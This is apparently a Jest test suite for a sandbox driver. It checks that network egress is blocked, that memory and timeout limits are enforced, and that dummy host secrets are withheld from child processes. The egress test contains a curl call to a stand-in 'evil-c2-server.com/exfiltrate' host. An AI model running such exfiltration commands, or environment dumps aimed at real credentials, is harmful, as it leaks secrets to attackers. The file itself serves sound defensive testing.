import { ProcessIsolationSandboxDriver } from '../src/sandbox/drivers/process-isolation.driver';
import { SandboxTaskRequest } from '@ironloom/shared';

describe('Sandbox Security Hardening & Adversarial Isolation Suite (Prompt 11)', () => {
  let driver: ProcessIsolationSandboxDriver;

  beforeAll(() => {
    // Set ambient host secrets in the host process to simulate live server environment
    process.env.GROQ_API_KEY = 'gsk_secret_production_key_never_leak';
    process.env.SUPABASE_SERVICE_ROLE_KEY = 'supabase_secret_admin_role_key';
    process.env.DATABASE_URL =
      'postgresql://postgres:super_secret_pw@db.ironloom.internal:5432/prod';

    driver = new ProcessIsolationSandboxDriver();
  });

  afterAll(async () => {
    // Clean up
  });

  it('1. should block deliberate network egress when networkPolicy is "none"', async () => {
    const req: SandboxTaskRequest = {
      taskId: 'sbx-sec-egress-test',
      commands: ['curl -s https://evil-c2-server.com/exfiltrate'],
      networkPolicy: 'none',
      resourceLimits: { timeoutMs: 5000, memoryMb: 256, cpuQuota: 100000 },
    };

    const result = await driver.executeTask(req);

    expect(result.exitCode).not.toBe(0);
    expect(result.networkViolations && result.networkViolations.length).toBeGreaterThan(0);
    expect(result.stderr).toContain('[Sandbox Firewall] Network egress blocked');
  });

  it('2. should enforce memory resource caps and terminate memory bombs with SIGKILL (137)', async () => {
    const req: SandboxTaskRequest = {
      taskId: 'sbx-sec-memory-bomb',
      commands: ['node -e "allocate_infinite_memory"'],
      networkPolicy: 'none',
      resourceLimits: { timeoutMs: 5000, memoryMb: 128, cpuQuota: 100000 },
    };

    const result = await driver.executeTask(req);

    expect(result.oomKilled).toBe(true);
    expect(result.exitCode).toBe(137);
    expect(result.stderr).toContain('Process exceeded memory limit');
  });

  it('3. should enforce hard execution timeouts and terminate hanging processes (124)', async () => {
    const isWindows = process.platform === 'win32';
    const sleepCmd = isWindows ? 'ping 127.0.0.1 -n 5' : 'sleep 5';

    const req: SandboxTaskRequest = {
      taskId: 'sbx-sec-timeout-test',
      commands: [sleepCmd],
      networkPolicy: 'none',
      resourceLimits: { timeoutMs: 600, memoryMb: 256, cpuQuota: 100000 },
    };

    const result = await driver.executeTask(req);

    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBe(124);
    expect(result.stderr).toContain(
      '[Sandbox Timeout] Process execution exceeded hard timeout limit',
    );
  });

  it('4. should strictly sanitize environment and NEVER leak ambient host secrets to child process', async () => {
    const isWindows = process.platform === 'win32';
    const printEnvCmd = isWindows ? 'set' : 'env';

    const req: SandboxTaskRequest = {
      taskId: 'sbx-sec-env-sanitization',
      commands: [printEnvCmd],
      networkPolicy: 'none',
      env: {
        CUSTOM_TASK_VAR: 'safe_permitted_value',
      },
      resourceLimits: { timeoutMs: 5000, memoryMb: 256, cpuQuota: 100000 },
    };

    const result = await driver.executeTask(req);

    expect(result.exitCode).toBe(0);
    // Explicitly permitted variable is present
    expect(result.stdout).toContain('CUSTOM_TASK_VAR=safe_permitted_value');

    // Host secrets must NEVER be present in the sandbox process environment
    expect(result.stdout).not.toContain('gsk_secret_production_key_never_leak');
    expect(result.stdout).not.toContain('supabase_secret_admin_role_key');
    expect(result.stdout).not.toContain('super_secret_pw');
  });
});
